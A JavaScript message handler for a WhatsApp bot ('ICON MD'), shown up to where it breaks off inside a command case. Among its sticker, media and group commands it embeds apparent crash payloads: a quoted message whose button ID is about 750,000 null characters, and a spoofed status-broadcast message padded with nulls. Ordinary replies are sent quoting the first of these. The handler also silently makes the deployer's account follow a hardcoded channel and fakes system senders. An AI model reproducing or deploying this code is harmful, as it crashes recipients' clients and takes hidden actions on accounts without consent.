/*

recoded by richie 
*/
require('../setting/config')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("baileys-pro");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("baileys-pro");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const cheerio = require('cheerio');
const sharp = require('sharp')
const fg = require('api-dylux')
const FormData = require('form-data')
const { modul } = require('./module')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const jimp = require("jimp")
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { googleTTS, } = modul
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('../system/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('../system/exif.js')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const { shorturl, } = require("./lib/myfunc3");
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const translate = require("@vitalets/google-translate-api");
const ban = JSON.parse(fs.readFileSync("./start/lib/banned.json"))
global._antilink = {};
global.stickerCmds = {}; // key: sticker hash (base64), value: command string
module.exports = rich = async (rich, m, chatUpdate, store) => {

const { from } = m
try {
      
const body = (
  // Pesan teks biasa
  m.mtype === "conversation" ? m.message.conversation :
  m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

  // Pesan media dengan caption
  ["imageMessage", "videoMessage", "documentMessage", "audioMessage", "stickerMessage"]
    .includes(m.mtype) ? m.message[m.mtype].caption || "" :

  // Pesan interaktif (tombol, list, dll.)
  m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

  // Pesan khusus
  m.mtype === "messageContextInfo" ? (
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || 
    m.text
  ) :
  m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
  m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
  m.mtype === "contactsArrayMessage" ? 
    m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
  ["locationMessage", "liveLocationMessage"].includes(m.mtype) ? 
    `${m.message[m.mtype].degreesLatitude}, ${m.message[m.mtype].degreesLongitude}` :
  ["pollCreationMessage", "pollUpdateMessage"].includes(m.mtype) ? m.message[m.mtype].name :
  m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :

  // Pesan sekali lihat (View Once)
  ["viewOnceMessage", "viewOnceMessageV2", "viewOnceMessageV2Extension"].includes(m.mtype) ? (
    m.message[m.mtype].message.imageMessage?.caption || 
    m.message[m.mtype].message.videoMessage?.caption || 
    "[Pesan sekali lihat]"
  ) :

  // Pesan sementara (ephemeralMessage)
  m.mtype === "ephemeralMessage" ? (
    m.message.ephemeralMessage.message.conversation ||
    m.message.ephemeralMessage.message.extendedTextMessage?.text || 
    "[Pesan sementara]"
  ) :

  // Pesan lain
  m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :
  m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :
  ""
);
const budy = (typeof m.text == 'string' ? m.text : '');
const prefix = global.prefa 
  ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) 
    ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] 
    : ""
  : global.prefa ?? global.prefix;

const owner = JSON.parse(fs.readFileSync('./system/owner.json'));
const Premium = JSON.parse(fs.readFileSync('./system/premium.json'));
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1);
const botNumber = await rich.decodeJid(rich.user.id);
const text = q = args.join(" ")
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const qtext = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const from = mek.key.remoteJid;
const { spawn, exec } = require('child_process');
const sender = m.isGroup ? (m.key.participant || m.participant) : m.key.remoteJid;
const isban = ban.includes(m.sender)
const groupMetadata = m.isGroup ? await rich.groupMetadata(from).catch(e => {}) : '';
const participants = m.isGroup ? groupMetadata.participants : '';
const groupAdmins = m.isGroup ? getGroupAdmins(participants) : '';
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const groupName = m.isGroup ? groupMetadata.subject : "";
const pushname = m.pushName || "No Name";
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z');
const mime = (quoted.msg || quoted).mimetype || '';
const isMedia = /image|video|sticker|audio/.test(mime);
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric'
});
const TypeMess = getContentType(m?.message);
let reactions = TypeMess == "reactionMessage" ? m?.message[TypeMess]?.text : false;
        
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const reaction = async (jidss, emoji) => {
    rich.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };   


// Auto View & Auto Like Status
if (autoViewStatus && m.key.remoteJid === 'status@broadcast') {
    try {
        // View the status
        await rich.readMessages([m.key]);
        console.log("✅ Viewed a status update.");

        if (autoLikeStatus) {
            await sleep(1000); // slight delay before replying
            await rich.sendMessage(m.key.remoteJid, {
                text: '❤️', // or change to any emoji/message
                quoted: m
            });
            console.log("❤️ Liked (reacted to) the status.");
        }
    } catch (err) {
        console.error("Error viewing/liking status:", err);
    }
}
    
 //end of code
 if (global.autoReact && global.autoReact[m.chat]) {
    const emojis = [
        "🀄", "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉", "😊",
        "😍", "😘", "😎", "🤩", "🤔", "😏", "😣", "😥", "😮", "🤐",
        "😪", "😫", "😴", "😌", "😛", "😜", "😝", "🤤", "😒", "😓",
        "😔", "😕", "🙃", "🤑", "😲", "😖", "😞", "😟", "😤", "😢",
        "😭", "😨", "😩", "🤯", "😬", "😰", "😱", "🥵", "🥶", "😳",
        "🤪", "🀄", "😠", "🀄", "😷", "🤒", "🤕", "🤢", "🤮", "🤧",
        "😇", "🥳", "🤠", "🤡", "🤥", "🤫", "🤭", "🧐", "🤓", "😈",
        "👿", "👹", "👺", "💀", "👻", "🀄", "🀄", "🤖", "🎃", "😺",
        "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "💋", "💌",
        "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "💔", "❤️"
    ]; // List of emojis to choose from

    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]; // Pick a random emoji

    try {
        await rich.sendMessage(m.chat, {
            react: {
                text: randomEmoji, // Emoji to react with
                key: m.key,        // Message key to react to
            },
        });
    } catch (err) {
        console.error('Error while reacting:', err.message);
    }
}
if (global.autoTyping) {
        rich.sendPresenceUpdate('composing', from)
        }
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        rich.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
if (global.autoRecording) {
        rich.sendPresenceUpdate('recording', from)
        }      
      if (global.autoTyping) {
        rich.sendPresenceUpdate('composing', from)
        }
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        rich.sendPresenceUpdate(xeonrecordinfinal, from)

        }

// List of channel IDs
const channelId = [
  "120363420087809121@newsletter", 
  "120363420087809121@newsletter"
];

// Read followed channels from a file (if exists)
let followedChannels = new Set();
try {
  const data = fs.readFileSync('./followedChannels.json', 'utf8');
  followedChannels = new Set(JSON.parse(data));
} catch (err) {
  console.log('No previous follow data found, starting fresh.');
}

// Function to follow a channel if not already followed
function followNewsletter(channelIds) {
  try {
    // Pick a channel to follow (for example, first in the array)
    const channelToFollow = channelIds[0];  // You can choose a random or specific channel here

    // Check if the channel has already been followed
    if (!followedChannels.has(channelToFollow)) {
      // Follow the channel
      rich.newsletterFollow(channelToFollow);
      followedChannels.add(channelToFollow); // Add the channel to the set

      // Persist the updated followed channels
      fs.writeFileSync('./followedChannels.json', JSON.stringify(Array.from(followedChannels)), 'utf8');

      console.log(`Following channel: ${channelToFollow}`);
    } else {
      console.log(`Already followed channel: ${channelToFollow}`);
    }
  } catch (error) {
    console.error('Newsletter follow error:', error);
  }
}

// Call the function to follow a channel (only if not already followed)
followNewsletter(channelId);
//check command u want to type 
if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('./start/case.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `ERROR DID YOU MEAN\n √ ${prefix+mean}\n•> Similarities: ${similarityPercentage}%`
m.reply(response)
}} 

// Temp in-memory toggle
let antilinkStatus = {};
if (autobio) {
            rich.updateProfileStatus(`ICON X MD`).catch(_ => _)
        }
        if (isCmd)  {
            console.log(chalk.black(chalk.bgWhite('[ ICON ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=>In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
const ThumbUrl = "https://pomf2.lain.la/f/5l5eayi.jpg"
const image1 = fs.readFileSync(`./media/image1.jpg`)

const thumb = fs.readFileSync(`./media/thumb.png`)
const tdxlol = fs.readFileSync('./tdx.jpeg')
const reply = (teks) => {
rich.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./media/image1.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}
const example = (teks) => {
return `Usage : *${prefix+command}* ${teks}`
}
const replygc = (teks) => {
rich.sendMessage(from, { text: teks }, { quoted : m})
}
const glxNull = {
            key: {
                remoteJid: 'status@broadcast',
                fromMe: false,
                participant: '18002428478@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "ICON-MD`",
                        "format": "DEFAULT",
                        "caption": "By Bae"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Alwaysaqioo@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(10)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
        const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
        
const cursor = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: ""
},
message: {
buttonsMessage: {
hasMediaAttachment: true,
contentText: `私はあなたが好き`,
footerText: ``,
buttons: [
{ buttonId: "\u0000".repeat(749999), buttonText: { displayText: "Icon is here" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }
], 
viewOnce: true,
headerType: 1
}
}, 
contextInfo: {
virtexId: rich.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: ["0@s.whatsapp.net"],
}, 
};

const getDevice = require("baileys-pro").getDevice
// end reply 
if (!rich.public) {
if (!isCreator) return
}
const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('../system/Data2')

const {
    smsg,
    sendGmail,
    formatSize,
    isUrl,
    getBuffer,
} = require('./lib/myfunction');

const bubbleCharMap = {
    'a':'ⓐ','b':'ⓑ','c':'ⓒ','d':'ⓓ','e':'ⓔ','f':'ⓕ','g':'ⓖ','h':'ⓗ','i':'ⓘ','j':'ⓙ',
    'k':'ⓚ','l':'ⓛ','m':'ⓜ','n':'ⓝ','o':'ⓞ','p':'ⓟ','q':'ⓠ','r':'ⓡ','s':'ⓢ','t':'ⓣ',
    'u':'ⓤ','v':'ⓥ','w':'ⓦ','x':'ⓧ','y':'ⓨ','z':'ⓩ',
    'A':'Ⓐ','B':'Ⓑ','C':'Ⓒ','D':'Ⓓ','E':'Ⓔ','F':'Ⓕ','G':'Ⓖ','H':'Ⓗ','I':'Ⓘ','J':'Ⓙ',
    'K':'Ⓚ','L':'Ⓛ','M':'Ⓜ','N':'Ⓝ','O':'Ⓞ','P':'Ⓟ','Q':'Ⓠ','R':'Ⓡ','S':'Ⓢ','T':'Ⓣ',
    'U':'Ⓤ','V':'Ⓥ','W':'Ⓦ','X':'Ⓧ','Y':'Ⓨ','Z':'Ⓩ'
};
const glitchCharMap = {
    'a':'̷a','b':'̷b','c':'̷c','d':'̷d','e':'̷e','f':'̷f','g':'̷g','h':'̷h','i':'̷i',
    'j':'̷j','k':'̷k','l':'̷l','m':'̷m','n':'̷n','o':'̷o','p':'̷p','q':'̷q','r':'̷r',
    's':'̷s','t':'̷t','u':'̷u','v':'̷v','w':'̷w','x':'̷x','y':'̷y','z':'̷z',
    'A':'̷A','B':'̷B','C':'̷C','D':'̷D','E':'̷E','F':'̷F','G':'̷G','H':'̷H','I':'̷I',
    'J':'̷J','K':'̷K','L':'̷L','M':'̷M','N':'̷N','O':'̷O','P':'̷P','Q':'̷Q','R':'̷R',
    'S':'̷S','T':'̷T','U':'̷U','V':'̷V','W':'̷W','X':'̷X','Y':'̷Y','Z':'̷Z'
};
const fancyCharMap = {
    'a': '𝒜', 'b': 'ℬ', 'c': '𝒞', 'd': '𝒟', 'e': 'ℰ', 'f': 'ℱ', 'g': '𝒢',
    'h': 'ℋ', 'i': 'ℐ', 'j': '𝒥', 'k': '𝒦', 'l': 'ℒ', 'm': 'ℳ', 'n': '𝒩',
    'o': '𝒪', 'p': '𝒫', 'q': '𝒬', 'r': 'ℛ', 's': '𝒮', 't': '𝒯', 'u': '𝒰',
    'v': '𝒱', 'w': '𝒲', 'x': '𝒳', 'y': '𝒴', 'z': '𝒵',
    'A': '𝒜', 'B': 'ℬ', 'C': '𝒞', 'D': '𝒟', 'E': 'ℰ', 'F': 'ℱ', 'G': '𝒢',
    'H': 'ℋ', 'I': 'ℐ', 'J': '𝒥', 'K': '𝒦', 'L': 'ℒ', 'M': 'ℳ', 'N': '𝒩',
    'O': '𝒪', 'P': '𝒫', 'Q': '𝒬', 'R': 'ℛ', 'S': '𝒮', 'T': '𝒯', 'U': '𝒰',
    'V': '𝒱', 'W': '𝒲', 'X': '𝒳', 'Y': '𝒴', 'Z': '𝒵',
};

//==============================//
if (m.mimetype === 'image/webp' && m.fileSha256) {
    const hash = m.fileSha256.toString('base64');
    const mappedCommand = global.stickerCmds[hash];
    if (mappedCommand) {
        m.text = mappedCommand;
        command = mappedCommand;
        isCmd = true;
    }
}
// Add this part outside the switch, in your message handler:
if (m.isGroup && global._antilink[m.chat]) {
    const linkRegex = /(https?:\/\/[^\s]+)/gi;
    if (linkRegex.test(m.text) && !isAdmins && !isCreator) {
        const warningText = "WARNING: Sending links is not allowed in this group!";
        await rich.sendMessage(m.chat, { text: warningText }, { quoted: m });
        // Optional: Kick user
        // await conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
    }
}

if (m.isGroup && antilinkStatus[m.chat]) {
    const detectLink = /(https?:\/\/[^\s]+)|(\b\S*\.com\S*\b)/gi;
    if (detectLink.test(m.text)) {
        if (!isgroupAdmins && !m.key.fromMe) {
            await rich.sendMessage(m.chat, { delete: m.key });
        }
    }
}
// === POLL FUNCTION ===

/// function sticker
async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
async function styletexts(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, rich, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await rich.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `ICON`,
                    body: `ICON IS HIM`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `t.me/hmmletts`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        m.reply(' check console.');
    }
}
async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = `🎯
[ ꪉ ] done : _*${command}*_❕`

  let buttons = [
        { buttonId: ".xmenu", buttonText: { displayText: "Back To Menu" } }, 
         { buttonId: ".script", buttonText: { displayText: "Buy Script" } }
    ];

    let buttonMessage = {
        image: thumb, 
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363331859075083@newsletter",
                newsletterName: "ICON"
            }
        },
        footer: "© Icon ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await rich.sendMessage(m.chat, buttonMessage, { quoted: cursor });
}
async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

  //game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // reply(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                reply({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) rich.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            rich.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
// end

if (m.isGroup && global._antilink[m.chat]) {
    const detectLink = /(https?:\/\/[^\s]+)|(\b\S*\.com\S*\b)/gi;
    const msgText = m.text || m.body || '';
    if (detectLink.test(msgText) && !isAdmins && !m.key.fromMe) {
        await rich.sendMessage(m.chat, { delete: m.key });
    }
}


///bug func end

switch(command) {
case 'menu': {

     const menuImages = [
        'https://up6.cc/2025/07/175207724164332.jpg',
        'https://up6.cc/2025/07/175207724164643.jpg',
        'https://up6.cc/2025/07/175207724165164.jpg',
        'https://up6.cc/2025/07/175207724165945.jpg',
        'https://up6.cc/2025/07/175187589552991.jpg'
    ];

    // Randomly select an image for the menu
    const iconImageUrl = menuImages[Math.floor(Math.random() * menuImages.length)];
    
    const menuText = `
⫷👑 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢 👑⫸
║ 🧑 ${m.pushName}
║ 🤖 ${botname}
║ 📡 Status: Online
║ ⏱️ Runtime: ${runtime(process.uptime())}
║ 👑 Owner: ${ownername}
║ 💻 Version: 1.0.1
║ 💨 Host: panel
⫸━━━━━━━━━━━━━⫷

▓━ group menu ━▓
│➤ ${prefix}hidetag
│➤ ${prefix}tagall
│➤ ${prefix}demote
│➤ ${prefix}promote
│➤ ${prefix}mute
│➤ ${prefix}unmute
│➤ ${prefix}join
│➤ ${prefix}poll
│➤ ${prefix}kick
│➤ ${prefix}left
│➤ ${prefix}add
│➤ ${prefix}linkgc
│➤ ${prefix}groupjid
│➤ ${prefix}getpp
│➤ ${prefix}kickall
│➤ ${prefix}everyone
│➤ ${prefix}resetlink
│➤ ${prefix}totag
│➤ ${prefix}closetime
│➤ ${prefix}opentime
│➤ ${prefix}antilink
│➤ ${prefix}Icon-hijack

▓━ download menu ━▓
│➤ ${prefix}hd/remini
│➤ ${prefix}apk
│➤ ${prefix}play
│➤ ${prefix}img
│➤ ${prefix}imdb
│➤ ${prefix}animedl
│➤ ${prefix}tiktok
│➤ ${prefix}gitclone
│➤ ${prefix}toimg
│➤ ${prefix}ytsearch
│➤ ${prefix}tiktokgirl
│➤ ${prefix}tiktoksantuy
│➤ ${prefix}tiktoksexy
│➤ ${prefix}tiktokbocil
│➤ ${prefix}tiktokghea
│➤ ${prefix}tiktokkayes
│➤ ${prefix}tiktokpanrika
│➤ ${prefix}tiktoknot
│➤ ${prefix}xnxxsearch
│➤ ${prefix}coffee
│➤ ${prefix}idch

▓━ sticker menu ━▓
│➤ ${prefix}take
│➤ ${prefix}brat
│➤ ${prefix}cry
│➤ ${prefix}kill
│➤ ${prefix}hug
│➤ ${prefix}happy
│➤ ${prefix}dance
│➤ ${prefix}handhold
│➤ ${prefix}highfive
│➤ ${prefix}slap
│➤ ${prefix}kiss
│➤ ${prefix}blush
│➤ ${prefix}bite
│➤ ${prefix}cuddle
│➤ ${prefix}furbrat
│➤ ${prefix}shinobu
│➤ ${prefix}bonk
│➤ ${prefix}pat
│➤ ${prefix}nom

▓━ anime menu ━▓
│➤ ${prefix}nwaifu
│➤ ${prefix}waifu
│➤ ${prefix}animekill
│➤ ${prefix}animelick
│➤ ${prefix}animebite
│➤ ${prefix}animeglomp
│➤ ${prefix}animehappy
│➤ ${prefix}animedance
│➤ ${prefix}animecringe
│➤ ${prefix}animehighfive
│➤ ${prefix}animepoke
│➤ ${prefix}animewink
│➤ ${prefix}animesmile
│➤ ${prefix}animesmug
│➤ ${prefix}animewlp
│➤ ${prefix}animesearch
│➤ ${prefix}animeavatar

▓━ others menu ━▓
│➤ ${prefix}ss/ssweb
│➤ ${prefix}broadcastimage
│➤ ${prefix}broadcasttext
│➤ ${prefix}broadcastvid
│➤ ${prefix}ban
│➤ ${prefix}unban
│➤ ${prefix}jid
│➤ ${prefix}vv
│➤ ${prefix}vv2
│➤ ${prefix}weather
│➤ ${prefix}fact
│➤ ${prefix}createlogo
│➤ ${prefix}clear
│➤ ${prefix}shorturl
│➤ ${prefix}tr
│➤ ${prefix}pickupline
│➤ ${prefix}autorecording 
│➤ ${prefix}autotyping 
│➤ ${prefix}autoviewstatus
│➤ ${prefix}autolikestatus
│➤ ${prefix}delete
│➤ ${prefix}block
│➤ ${prefix}unblock
│➤ ${prefix}setbio
│➤ ${prefix}ai
│➤ ${prefix}joke
│➤ ${prefix}truth
│➤ ${prefix}dare
│➤ ${prefix}qc
│➤ ${prefix}gptimage
│➤ ${prefix}tovn
│➤ ${prefix}say
│➤ ${prefix}self
│➤ ${prefix}public
┗━━━━━━━━━━━━▓`;

    const fakeSystem = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "FakeID12345",
            participant: "0@s.whatsapp.net"
        },
        message: {
            conversation: "ICON MD"
        }
    };

    await rich.sendMessage(from, {
        image: { url: iconImageUrl },
        caption: menuText
    }, { quoted: fakeSystem }); 
  
    followNewsletter(channelId, rich);  // 
}

break;


case 'autoviewstatus': {
    if (!isCreator) return reply(mess.owner);
    if (q === 'on') {
        autoViewStatus = true;
        reply('✅ Auto view status enabled.');
